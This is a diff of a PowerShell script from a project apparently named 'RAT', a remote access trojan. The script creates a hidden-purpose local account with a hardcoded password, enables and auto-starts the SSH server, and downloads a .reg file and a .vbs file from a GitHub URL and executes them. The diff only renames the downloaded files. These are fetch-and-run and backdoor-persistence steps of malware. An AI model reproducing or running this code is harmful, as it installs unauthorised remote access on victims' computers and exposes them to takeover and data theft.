@@ -47,11 +47,10 @@ $NewName = "jarbou3"
 $Password = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
 create_account -NewName $NewName -Password $Password
 
-$reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/admin.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"
 
 $vbs_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"
 
 
 
@@ -61,7 +60,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 
-./"$reg_file.reg";"$vbs_file.vbs"
+./wreg.reg; ./hello
 
 
 Set-Location C:\Users\user\OneDrive\Bureau\rat\files
